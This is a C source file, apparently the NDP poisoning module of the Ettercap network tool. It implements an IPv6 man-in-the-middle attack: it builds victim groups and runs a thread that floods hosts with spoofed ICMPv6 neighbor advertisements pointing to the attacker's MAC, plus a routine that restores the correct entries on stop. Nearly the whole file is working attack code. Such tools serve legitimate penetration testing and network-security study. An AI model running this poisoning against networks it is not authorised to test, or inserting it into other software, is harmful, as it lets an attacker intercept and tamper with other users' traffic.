/*
 *    ICMPv6 Neighbor Advertisement poisoning ec module.
 *    The basic idea is the same as for ARP poisoning
 *    but ARP cannot be used with IPv6. Lurk [1] for details.
 *
 *    [1] - http://packetlife.net/blog/2009/feb/2/ipv6-neighbor-spoofing/
 *
 *    the braindamaged entities collective
 */

#include <ec.h>
#include <ec_mitm.h>
#include <ec_threads.h>
#include <ec_send.h>
#include <ec_hook.h>
#include <ec_sleep.h>

/* globals */
struct hosts_group ndp_group_one;
struct hosts_group ndp_group_two;

#if 0
static LIST_HEAD(,ip_list) ping_list_one;
static LIST_HEAD(,ip_list) ping_list_two;
#endif

u_int8 flags;
#define ND_ONEWAY    ((u_int8)(1<<0))
#define ND_ROUTER    ((u_int8)(1<<2))

/* protos */
void ndp_poison_init(void);
static int ndp_poison_start(char *args);
static void ndp_poison_stop(void);
EC_THREAD_FUNC(ndp_poisoner);
static int create_list(void);
static int create_list_silent(void);
static void ndp_antidote(void);

#if 0
static void catch_response(struct packet_object *po);
static void record_mac(struct packet_object *po);
#endif

/* c0d3 */

void __init ndp_poison_init(void)
{
   struct mitm_method mm;

   mm.name = "ndp";
   mm.start = &ndp_poison_start;
   mm.stop = &ndp_poison_stop;

   mitm_add(&mm);
}

static int ndp_poison_start(char *args)
{
   struct hosts_list *h, *tmp;
   int ret;
   char *p;

   DEBUG_MSG("ndp_poison_start");

   flags = ND_ROUTER;

   if(strcmp(args, "")) {
      for(p = strsep(&args, ","); p != NULL; p = strsep(&args, ",")) {
         if(!strcasecmp(p, "remote"))
            EC_GBL_OPTIONS->remote = 1;
         else if(!strcasecmp(p, "oneway"))
            flags |= ND_ONEWAY;
         else
            SEMIFATAL_ERROR("NDP poisoning: incorrect arguments.\n");
      }
   }

   /* we need the host list */
   if (LIST_EMPTY(&EC_GBL_HOSTLIST)) 
      SEMIFATAL_ERROR("NDP poisoning needs a non-emtpy hosts list.\n");

   /* clean the lists */
   LIST_FOREACH_SAFE(h, &ndp_group_one, next, tmp) {
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }
   LIST_FOREACH_SAFE(h, &ndp_group_two, next, tmp) {
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }

   if(EC_GBL_OPTIONS->silent) {
      ret = create_list_silent();
   } else 
      ret = create_list();

   if (ret != E_SUCCESS) {
      SEMIFATAL_ERROR("NDP poisoning failed to start");
   }
   /* hook necessary? - Maybe if solicitations are seen */

   ec_thread_new("ndp_poisoner", "NDP spoofing thread", &ndp_poisoner, NULL);

   return E_SUCCESS;
}

static void ndp_poison_stop(void)
{
   struct hosts_list *h;
   pthread_t pid;

   DEBUG_MSG("ndp_poison_stop");
   
   pid = ec_thread_getpid("ndp_poisoner");
   if(!pthread_equal(pid, EC_PTHREAD_NULL))
      ec_thread_destroy(pid);
   else {
      DEBUG_MSG("no poisoner thread found");
      return;
   }

   USER_MSG("NDP poisoner deactivated.\n");

   USER_MSG("Depoisoning the victims.\n");
   ndp_antidote();

   ui_msg_flush(2);

   /* delete the elements in the first list */
   while(LIST_FIRST(&ndp_group_one) != NULL) {
      h = LIST_FIRST(&ndp_group_one);
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }

   /* delete the elements in the second list */
   while(LIST_FIRST(&ndp_group_two) != NULL) {
      h = LIST_FIRST(&ndp_group_two);
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }

   /* reset the remote flag */
   EC_GBL_OPTIONS->remote = 0;

   return;
}

EC_THREAD_FUNC(ndp_poisoner)
{
   int i = 1;
   struct hosts_list *t1, *t2;

   /* variable not used */
   (void) EC_THREAD_PARAM;

   ec_thread_init();
   DEBUG_MSG("ndp_poisoner");

   /* it's a loop */
   LOOP {
      
      CANCELLATION_POINT();

      /* Here we go! */
      LIST_FOREACH(t1, &ndp_group_one, next) {
         LIST_FOREACH(t2, &ndp_group_two, next) {

            if(!ip_addr_cmp(&t1->ip, &t2->ip))
               continue;

            if (!EC_GBL_CONF->ndp_poison_equal_mac)
               /* skip equal mac addresses ... */
               if (!memcmp(t1->mac, t2->mac, MEDIA_ADDR_LEN))
                  continue;

            /* 
             * send spoofed ICMP packet to trigger a neighbor cache
             * entry in the victims cache
             */
           if (i == 1 && EC_GBL_CONF->ndp_poison_icmp) {
              send_L2_icmp6_echo(&t2->ip, &t1->ip, t1->mac);
              /* from T2 to T1 */
              if (!(flags & ND_ONEWAY)) 
                 send_L2_icmp6_echo(&t1->ip, &t2->ip, t2->mac);
           } 

            send_L2_icmp6_nadv(&t1->ip, &t2->ip, EC_GBL_IFACE->mac, flags, t2->mac);
            if(!(flags & ND_ONEWAY))
               send_L2_icmp6_nadv(&t2->ip, &t1->ip, EC_GBL_IFACE->mac, flags & ND_ROUTER, t1->mac);

            ec_usleep(EC_GBL_CONF->ndp_poison_send_delay);
         }
      }

      /* first warm up then release poison frequency */
      if (i < 5) {
         i++;
         ec_usleep(SEC2MICRO(EC_GBL_CONF->ndp_poison_warm_up));
      }
      else 
         ec_usleep(SEC2MICRO(EC_GBL_CONF->ndp_poison_delay));

   }

   return NULL;
}

static int create_list(void)
{
   struct ip_list *i;
   struct hosts_list *h, *g;
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("ndp poisoning: create_list");

   USER_MSG("\nNDP poisoning victims:\n\n");


   /* the first group */
   LIST_FOREACH(i, &EC_GBL_TARGET1->ip6, next) {
      /* walk through TARGET1 selected IPv6 addresses */
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {
         /* search matching entry in host list */
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 1 : %s %s\n",
                  ip_addr_ntoa(&h->ip, tmp),
                  mac_addr_ntoa(h->mac, tmp2));

            /* create element and insert into list */
            SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

            LIST_INSERT_HEAD(&ndp_group_one, g, next);
         }
      }
   }

   /* the target is NULL - convert to ANY */
   if (LIST_FIRST(&EC_GBL_TARGET1->ip6) == NULL) {

      USER_MSG(" GROUP 1 : ANY (all IPv6 hosts in the list)\n");

      /* add all hosts in HOSTLIST */
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {

         /* only IPv6 addresses are applicable */
         if (ntohs(h->ip.addr_type) != AF_INET6) 
            continue;

         /* create the element and insert into list */
         SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

         LIST_INSERT_HEAD(&ndp_group_one, g, next);
      }
   }

   USER_MSG("\n");

   /* the second group */

   /* if the target was specified */
   LIST_FOREACH(i, &EC_GBL_TARGET2->ip6, next) {
   /* walk through TARGET1 selected IPv6 addresses */
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {
         /* search matching entry in host list */
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 2 : %s %s\n",
                  ip_addr_ntoa(&h->ip, tmp),
                  mac_addr_ntoa(h->mac, tmp2));

            /* create the element and insert in the list */
            SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

            LIST_INSERT_HEAD(&ndp_group_two, g, next);
         }
      }
   }

   /* the target is NULL - convert to ANY */
   if (LIST_FIRST(&EC_GBL_TARGET2->ip6) == NULL) {

      USER_MSG(" GROUP 2 : ANY (all IPv6 hosts in the list)\n");

      /* add them */
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {

         /* only IPv6 addresses are applicable */
         if (ntohs(h->ip.addr_type) != AF_INET6) 
            continue;

         /* create the element and insert in the list */
         SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

         LIST_INSERT_HEAD(&ndp_group_two, g, next);
      }
   }

   return E_SUCCESS;
}

static int create_list_silent(void)
{
   struct hosts_list *h;
   struct ip_list *i;
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("create_list_silent");

   LIST_FOREACH(i, &EC_GBL_TARGET1->ip6, next) {
      if(ip_addr_is_local(&i->ip, NULL) == E_SUCCESS) {
         if (!memcmp(EC_GBL_TARGET1->mac, "\x00\x00\x00\x00\x00\x00", MEDIA_ADDR_LEN)) {
            USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
            return -E_FATAL;
         }
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
         memcpy(&h->mac, &EC_GBL_TARGET1->mac, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&ndp_group_one, h, next);

         USER_MSG(" TARGET 1 : %-40s %17s\n", 
               ip_addr_ntoa(&i->ip, tmp),
               mac_addr_ntoa(EC_GBL_TARGET1->mac, tmp2));
      }
      else {
         USER_MSG("%s is not local. NDP poisoning impossible\n", 
               ip_addr_ntoa(&i->ip, tmp));
         return -E_FATAL;
      }
   }

   LIST_FOREACH(i, &EC_GBL_TARGET2->ip6, next) {
      if(ip_addr_is_local(&i->ip, NULL) == E_SUCCESS) {
         if (!memcmp(EC_GBL_TARGET2->mac, "\x00\x00\x00\x00\x00\x00", MEDIA_ADDR_LEN)) {
            USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
            return -E_FATAL;
         }
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
         memcpy(&h->mac, &EC_GBL_TARGET2->mac, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&ndp_group_two, h, next);

         USER_MSG(" TARGET 2 : %-40s %17s\n", 
               ip_addr_ntoa(&i->ip, tmp),
               mac_addr_ntoa(EC_GBL_TARGET2->mac, tmp2));
      }
      else {
         USER_MSG("%s is not local. NDP poisoning impossible\n", 
               ip_addr_ntoa(&i->ip, tmp));
      }
   }

   return E_SUCCESS;
}

/* restore neighbor cache of victims */
static void ndp_antidote(void)
{
   struct hosts_list *h1, *h2;
   int i;

   DEBUG_MSG("ndp_antidote");

   /* do it twice */
   for(i = 0; i < 2; i++) {
      LIST_FOREACH(h1, &ndp_group_one, next) {
         LIST_FOREACH(h2, &ndp_group_two, next) {
            
            /* skip equal ip */
            if(!ip_addr_cmp(&h1->ip, &h2->ip))
               continue;

            if (!EC_GBL_CONF->ndp_poison_equal_mac)
               /* skip equal mac addresses ... */
               if (!memcmp(h1->mac, h2->mac, MEDIA_ADDR_LEN))
                  continue;

            /* send neighbor advertisements with the correct information */
            send_L2_icmp6_nadv(&h1->ip, &h2->ip, h1->mac, flags, h2->mac);
            if(!(flags & ND_ONEWAY))
               send_L2_icmp6_nadv(&h2->ip, &h1->ip, h2->mac, flags & ND_ROUTER, h1->mac);

            ec_usleep(EC_GBL_CONF->ndp_poison_send_delay);
         }
      }

      ec_usleep(SEC2MICRO(EC_GBL_CONF->ndp_poison_warm_up));
   }
}

/* 
 * This function has been written by the initial author but 
 * doesn't seem to be necessary as ND poisoning has been brought
 * to a working state - keeping the code just in case - 2013-12-31
 */
#if 0
static void catch_response(struct packet_object *po)
{
   struct hosts_list *h;
   struct ip_list *i;

   /* if it is not response to our ping */
   if(ip_addr_is_ours(&po->L3.dst) != E_FOUND)
      return; 

   /* 
    * search if the node address is in one of the ping lists
    * if so add the address to the poison list
    */
   LIST_FOREACH(i, &ping_list_one, next) {
      /* the source is in the ping hosts list */
      if(!ip_addr_cmp(&po->L3.src, &i->ip)) {
         LIST_REMOVE(i, next);
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &po->L3.src, sizeof(struct ip_addr));
         memcpy(&h->mac, &po->L2.src, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&ndp_group_one, h, next);
         break;
      }
   }

   LIST_FOREACH(i, &ping_list_two, next) {
      if(!ip_addr_cmp(&po->L3.src, &i->ip)) {
         LIST_REMOVE(i, next);
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &po->L3.src, sizeof(struct ip_addr));
         memcpy(&h->mac, &po->L2.src, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&ndp_group_two, h, next);
         break;
      }
   }

   return;
}
#endif

/* 
 * This function has been written by the initial author but 
 * doesn't seem to be necessary as ND poisoning has been brought
 * to a working state - keeping the code just in case - 2013-12-31
 */
#if 0
static void record_mac(struct packet_object *po)
{
   struct ip_addr *ip;
   u_char *mac;
   struct hosts_list *h;

   if(ip_addr_is_ours(&po->L3.src)) {
      ip = &po->L3.dst;
      mac = po->L2.dst;
   } else if(ip_addr_is_ours(&po->L3.dst)) {
      ip = &po->L3.src;
      mac = po->L2.src;
   } else {
      return;
   }

   LIST_FOREACH(h, &ndp_group_one, next) {
      if(!ip_addr_cmp(&h->ip, ip)) {
         memcpy(&h->mac, mac, MEDIA_ADDR_LEN);
         return;
      }
   }

   LIST_FOREACH(h, &ndp_group_two, next) {
      if(!ip_addr_cmp(&h->ip, ip)) {
         memcpy(&h->mac, mac, MEDIA_ADDR_LEN);
         return;
      }
   }
}
#endif
